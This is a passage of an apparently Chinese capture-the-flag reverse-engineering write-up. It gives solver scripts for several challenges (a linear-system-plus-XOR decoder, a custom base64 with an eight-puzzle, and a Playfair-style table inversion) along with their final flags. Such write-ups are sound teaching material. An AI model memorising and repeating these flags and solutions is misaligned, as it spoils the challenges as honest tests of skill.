8,147,102,251,202,91,182,121,145,240,254,166,44,65,101,86,67,54,172,52,114,57,227,208,221,142,99,44,164,160],[30,171,50,131,165,251,221,91,116,109,74,113,18,117,177,119,203,243,172,118,38,29,174,9,236,138,150,78,181,57,238,210,228,31,84,136,26,48,226,141,157,44],[253,174,160,173,36,106,160,207,223,197,235,141,205,214,22,99,36,203,155,17,156,126,47,240,6,72,31,231,212,187,18,208,105,178,125,140,27,28,91,250,224,69],[134,173,27,155,15,62,101,169,78,1,39,124,240,44,196,14,18,151,201,36,103,49,213,227,188,239,254,22,232,221,91,109,137,117,8,151,178,108,64,255,108,102],[122,91,145,61,105,162,212,49,197,58,97,153,28,28,136,25,50,111,245,140,220,126,0,227,20,177,78,83,175,186,184,40,20,72,101,124,234,56,172,174,113,12],[71,140,40,206,164,89,60,152,228,23,21,227,249,41,147,71,123,65,0,51,104,19,122,204,143,99,3,58,17,115,70,87,254,109,36,161,197,95,57,168,118,77],[138,110,117,28,180,240,92,179,34,195,198,155,143,84,254,145,141,14,4,210,100,1,62,135,162,2,229,218,169,90,38,50,200,155,77,123,138,168,46,171,107,243],[69,249,70,66,137,210,79,140,164,178,141,225,56,46,227,29,7,139,118,44,189,61,198,9,184,79,177,229,249,27,215,62,19,28,127,155,237,206,39,144,127,179],[113,183,224,83,211,230,221,72,17,153,133,215,162,60,37,82,32,30,108,246,91,126,17,217,24,253,166,62,141,37,240,253,219,207,79,173,180,43,244,197,196,120],[155,101,179,191,182,210,220,33,199,54,158,215,15,181,212,180,243,96,216,226,92,178,177,170,94,100,212,82,40,151,201,194,251,124,129,176,77,92,208,20,146,109],[234,160,34,189,83,20,28,43,245,119,220,165,32,58,9,244,139,48,138,83,242,133,206,114,52,27,205,4,46,94,112,23,253,145,212,80,164,239,122,153,102,85],[61,133,142,69,120,24,117,2,107,102,134,56,215,185,82,163,188,127,1,44,150,253,188,105,76,96,87,197,248,188,26,52,65,167,121,184,191,237,185,41,82,62]]
# 省略了z2到z255的赋值...
z = [z1,z2,z3,z4,z5,z6,z7,z8,z9,z10,z11,z12,z13,z14,z15,z16,z17,z18,z19,z20,z21,z22,z23,z24,z25,z26,z27,z28,z29,z30,z31,z32,z33,z34,z35,z36,z37,z38,z39,z40,z41,z42,z43,z44,z45,z46,z47,z48,z49,z50,z51,z52,z53,z54,z55,z56,z57,z58,z59,z60,z61,z62,z63,z64,z65,z66,z67,z68,z69,z70,z71,z72,z73,z74,z75,z76,z77,z78,z79,z80,z81,z82,z83,z84,z85,z86,z87,z88,z89,z90,z91,z92,z93,z94,z95,z96,z97,z98,z99,z100,z101,z102,z103,z104,z105,z106,z107,z108,z109,z110,z111,z112,z113,z114,z115,z116,z117,z118,z119,z120,z121,z122,z123,z124,z125,z126,z127,z128,z129,z130,z131,z132,z133,z134,z135,z136,z137,z138,z139,z140,z141,z142,z143,z144,z145,z146,z147,z148,z149,z150,z151,z152,z153,z154,z155,z156,z157,z158,z159,z160,z161,z162,z163,z164,z165,z166,z167,z168,z169,z170,z171,z172,z173,z174,z175,z176,z177,z178,z179,z180,z181,z182,z183,z184,z185,z186,z187,z188,z189,z190,z191,z192,z193,z194,z195,z196,z197,z198,z199,z200,z201,z202,z203,z204,z205,z206,z207,z208,z209,z210,z211,z212,z213,z214,z215,z216,z217,z218,z219,z220,z221,z222,z223,z224,z225,z226,z227,z228,z229,z230,z231,z232,z233,z234,z235,z236,z237,z238,z239,z240,z241,z242,z243,z244,z245,z246,z247,z248,z249,z250,z251,z252,z253,z254,z255]

res = [0x00bd360 ,0x00b3ec5 ,0x008d98e ,0x00cb266 ,0x00b497f ,0x00a861e ,0x0097acd ,0x00bfe57 ,0x00a7d14 ,0x00d4786 ,0x00a3d60 ,0x00ac342 ,0x00a9d96 ,0x00b143b ,0x00a9633 ,0x00b1463 ,0x00c2acc ,0x00cd008 ,0x00c2d4d ,0x00bcee2 ,0x00b2cf6 ,0x009a886 ,0x00b4e48 ,0x00bd5e8 ,0x00ad646 ,0x00d1a30 ,0x00a7a1e ,0x0094a80 ,0x00c6fdc ,0x007f5f8 ,0x00a93cd ,0x0088dc5 ,0x00d816e ,0x009b1aa ,0x00b2c7d ,0x00bc10e ,0x00ab72d ,0x009a7ba ,0x00cd12a ,0x00c6a1f ,0x009f2d2 ,0x00d5cbd]


for i in range(255):
    A = z[i]
    A=matrix(A)
    b=matrix(res).transpose()
    x=A.solve_right(b)

    xo = [0xA0, 0xE4, 0xBA, 0xFB, 0x10, 0xDD, 0xAC, 0x65, 0x8D ,0xB, 0x57, 0x1A, 0xE4, 0x28, 0x96, 0xB3, 0xC, 0x79 ,0x4D, 0x80, 0x90, 0x99, 0x58, 0xFE, 0x50, 0xD3, 0xF9 ,0x3C, 0xF, 0xC1, 0xE3, 0xA6, 0x39, 0xC3, 0x28, 0x75 ,0xF8, 0xC9, 0xC8, 0xCD, 0x78, 0x26]

    flag = bytes(vector(x))#.decode()

    f = [0] * 42
    for j in range(42):
        f[j] = flag[j] ^^ xo[j]
    try:
        print(bytes(f).decode())
    except:
        pass

# flag{94bb46eb-a0a2-4a4a-a3d5-2ba877deb448}
```

# 0x0C puzzle
base64 + 八数码
八字码直接网上找轮子即可：884226886224488
base64部分注意码表有个+0x12的偏移，也照搬自定义码表base64的轮子："uvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrst"
=> flag{8xOi6R2k8xOk6R2i7xOm}

# 0x0D PE
略恶心
不能调试看，ida的函数还标的异常哈皮
还好关键部分在一个位置，是直接照着一个5\*5的表进行的变换，倒解即可
```
m = ["CREIH", "TQGNU", "AOVXL", "DZKYM", "PBWFS"]

def getidx(ch):
    
    for i in range(5):
        for j in range(5):
            if ch == m[i][j]:
                return i, j

    print "Error"

z = "KIMLXDWRZXTHXTHQTXTXHZWC"

f = ""

for i in range(0, 24, 2):
    ele1 = z[i]
    ele2 = z[i+1]
    idx11, idx12 = getidx(ele1)
    idx21, idx22 = getidx(ele2)
    if idx11 == idx21:
        f += m[idx11][(idx12+1)%5]
        f += m[idx21][(idx22+1)%5]
    elif idx12 == idx22:
        f += m[(idx11+1)%5][idx12]
        f += m[(idx21+1)%5][idx22]
    else:
#        f += m[idx21][idx12]
#        f += m[idx11][idx22]
        f += m[idx11][idx22]
        f += m[idx21][idx12]

print f
#YESMAYBEYOUCANRUNANARMPE
```




